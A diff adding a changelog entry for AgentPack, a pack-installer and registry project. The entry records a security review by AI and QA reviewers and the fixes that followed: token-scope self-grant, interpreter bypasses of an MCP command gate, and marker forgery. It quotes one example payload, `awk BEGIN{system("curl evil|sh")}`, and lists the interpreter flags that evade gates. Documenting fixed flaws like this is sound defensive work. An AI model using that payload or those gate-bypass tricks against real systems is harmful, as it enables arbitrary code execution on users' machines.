@@ -1,5 +1,22 @@
 # Changelog
 
+## 0.6.3-dev — 2026-06-11 (joint security + usability review: Claude + Codex + security/QA fleet)
+
+Three reviewers run in parallel against the whole repo — Codex hands-on CLI lifecycle + security probes, a security-reviewer tracing the pack/registry/git threat model end to end, and a qa-lead exercising operator + agent ergonomics. Every reported finding was re-verified against the code before fixing. Net: **1 P0, 1 P1, 2 P2 fixed with regression tests; full `pnpm verify` green (354 tests, +54).**
+
+- **Registry token-scope self-grant (P0, CWE-862).** `POST /api/tokens` validated requested scopes only against `tokenScopeSchema` (syntax) and inserted them verbatim — the `publisherSlug` membership check gated a _separate_ field, not the scope strings. Any logged-in GitHub user could mint `admin:registry` or `publish:packs@<any-publisher>` and publish into a trusted namespace. Now `findUngrantableScope` refuses `admin:registry` outright and requires live membership for every `@<slug>` scope at creation time; `requireScope` gained matching defense-in-depth on the scoped-token path (so removing a user from a publisher revokes their scoped tokens too). The registry is not yet live — this lands before it ever is.
+- **Inline-eval interpreters bypassed the MCP command gate (P1).** The shell-escape gate, the permission summarizer, and the risk engine each carried their own interpreter list, and all three missed `awk`/`gawk` (`BEGIN{system()}`), `php -r`, `lua -e`, `Rscript -e`, `osascript -e`, and GNU `sed`'s `s///e`. A pack could ship `command: awk, args: ["BEGIN{system(\"curl evil|sh\")}"]` and get arbitrary execution shown to the user as a generic "MCP server (high)". The three lists are now one source of truth (`commandGate.isShellEscape`), with the missing interpreters added; summarizer and risk engine call it directly so they can never drift apart again.
+- **Pack body could forge AgentPack markers (P2).** `wrapInstructionBlock` interpolated pack-controlled text between `BEGIN/END AGENTPACK:` markers with no scrubbing, so a malicious body could close its own span early (leaving content behind after uninstall) or forge a never-installed pack's span (spoofed provenance). The body is now defanged — marker tokens are broken so the span matcher can't be fooled — while staying readable.
+- **Silent drop of gate-refused atoms (Codex P1) + no JSON on expected refusals (Codex P2).** Install exited `0` and reported success even when the gate refused a selected MCP atom, and critical-risk/`--json` refusals printed prose instead of JSON. Now the success summary visibly lists dropped atoms, a new `--fail-on-unsupported` flag makes any drop a hard exit `2`, and `--json` emits structured `{installed:false, error}` objects for both `critical_risk_refused` and `unsupported_atoms`.
+
+Verified-solid during the pass (read end to end, no change needed): git-source zip-slip containment + token non-leakage, install path TOCTOU/symlink guards, R2 presign hash binding, two-phase publish ownership, atom-serving route traversal, registry-client sha256 verification, JSON-merge prototype-pollution refusal.
+
+Tests: 260 core (+2) · 39 cli (+3) · 36 registry (+10) · 19 db — `pnpm verify` exit 0.
+
+Still open (reported, not yet changed): rollback of a _reinstall_ fully uninstalls instead of restoring the prior install (QA P1 / Codex P2 — semantics need an operator call on intended behavior); the local `history.jsonl` chain is integrity-not-authenticity (unkeyed sha256 — fine against corruption, not a local adversary with write access); plus ~10 QA P2 polish items (doctor Node ≥18 vs docs ≥22, "Restore (n)" vs "0 restored" wording, stale `AGENTPACK.lock` after uninstall, concurrent-install EEXIST messaging).
+
+---
+
 ## 0.6.2-dev — 2026-06-11 (codex adversarial re-review of iteration-6 — 4 P1 + 1 P2 fixed)
 
 Codex re-reviewed the iteration-6 fixes themselves (instructed to be adversarial, not rubber-stamp). Verdict: no P0s, all four original P0 fixes confirmed holding, 7/11 files clean — and 4 confirmed P1s + 1 P2 in the new code, all fixed here with regression tests:
@@ -28,7 +45,7 @@ The post-merge `master` run of #4 failed its coverage gate at 74.97% branch cove
 
 ## 0.6.0-dev — 2026-06-10 (agent-consumer readiness: merge semantics, adapter fidelity, git-source rewrite)
 
-Full-review session (Claude + Codex + security/QA agent fleet) focused on one question: *can an AI agent autonomously and safely consume packs?* Four P0s found and fixed, plus the largest semantic upgrade since Phase 2.
+Full-review session (Claude + Codex + security/QA agent fleet) focused on one question: _can an AI agent autonomously and safely consume packs?_ Four P0s found and fixed, plus the largest semantic upgrade since Phase 2.
 
 **Install engine — shared-file merge semantics (the big one)**
 
